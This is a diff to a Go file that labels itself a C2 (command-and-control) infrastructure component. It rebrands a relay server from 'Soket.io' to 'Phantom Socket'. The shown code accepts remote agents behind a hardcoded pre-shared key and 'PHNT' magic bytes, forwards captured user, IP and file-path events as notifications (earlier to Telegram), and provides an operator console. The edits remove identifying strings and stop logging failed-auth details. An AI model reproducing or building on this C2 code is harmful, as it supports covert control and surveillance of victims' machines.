@@ -1,6 +1,6 @@
-// Project: Soket.io v1.0 Final
+// Project: Phantom Socket v1.0.0-stable
 // Module: C2 Component
-// Description: v1.0 Final C2 Infrastructure component.
+// Description: C2 Infrastructure component.
 
 package main
 
@@ -123,12 +123,12 @@ func backgroundPacketProcessor(peerID string, conn net.Conn, remoteAddr string) 
 				User:      user,
 				IP:        remoteAddr,
 				FilePath:  payload,
-				Details:   fmt.Sprintf("Real-time event captured by V1.0 agent monitor"),
+				Details:   fmt.Sprintf("Real-time event captured by agent monitor"),
 			})
 			if err != nil {
-				logger.Printf("[ERROR] Failed to send Telegram notification: %v", err)
+				logger.Printf("[ERROR] Failed to send notification: %v", err)
 			} else {
-				logger.Printf("[SUCCESS] Telegram notification sent for %s", eventType)
+				logger.Printf("[SUCCESS] Notification sent for %s", eventType)
 			}
 		}
 	}
@@ -138,7 +138,7 @@ func main() {
 	listenAddr := flag.String("listen", "", "Listen address (e.g., :42291). Overrides RELAY_LISTEN_ADDR env var")
 	flag.Parse()
 
-	logger.Println("Soket.io v1.0 Final Relay Server Starting...")
+	logger.Println("Phantom Socket v1.0.0-stable Relay Server Starting...")
 	logger.Println("Building with Go 1.22+ for high-performance concurrency")
 
 	cfg := config.LoadFromEnv()
@@ -236,7 +236,7 @@ func handleConnection(conn net.Conn, registry *peer.Registry, cfg *config.Config
 	remoteAddr := conn.RemoteAddr().String()
 	logger.Printf("New connection from %s", remoteAddr)
 
-	// PSK Pre-Auth (v1.0 Final Supreme Protection)
+	// PSK Pre-Auth
 	// Before TLS Handshake, expect 4-byte PSK
 	pskBuf := make([]byte, 4)
 	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
@@ -245,9 +245,9 @@ func handleConnection(conn net.Conn, registry *peer.Registry, cfg *config.Config
 		conn.Close()
 		return
 	}
-	// Expected PSK for v1.0 Final (OYEN)
+	// Expected PSK (OYEN)
 	if binary.BigEndian.Uint32(pskBuf) != 0x4F59454E {
-		logger.Printf("Pre-Auth failed (invalid PSK: %x) from %s", pskBuf, remoteAddr)
+		logger.Printf("Pre-Auth failed (invalid PSK) from %s", remoteAddr)
 		conn.Close()
 		return
 	}
@@ -274,13 +274,13 @@ func handleConnection(conn net.Conn, registry *peer.Registry, cfg *config.Config
 	}
 
 	if string(handshakeBuf[0:4]) != "PHNT" {
-		logger.Printf("Invalid magic bytes from %s: %v", remoteAddr, handshakeBuf[0:4])
+		logger.Printf("Invalid magic bytes from %s", remoteAddr)
 		conn.Close()
 		return
 	}
 
 	version := handshakeBuf[4]
-	if version != 0x01 { // V1.0 Supreme Standard
+	if version != 0x01 {
 		logger.Printf("Unsupported protocol version from %s: 0x%02x", remoteAddr, version)
 		conn.Close()
 		return
@@ -349,7 +349,7 @@ func printPeerList(registry *peer.Registry) {
 
 func startInteractiveConsole(registry *peer.Registry, cfg *config.Config) {
 	consoleMode = true
-	fmt.Println("Soket.io v1.0 Relay Multiplexer Console")
+	fmt.Println("Phantom Socket v1.0.0-stable Relay Console")
 	fmt.Println("Type 'help' for available commands.")
 	fmt.Println()
 
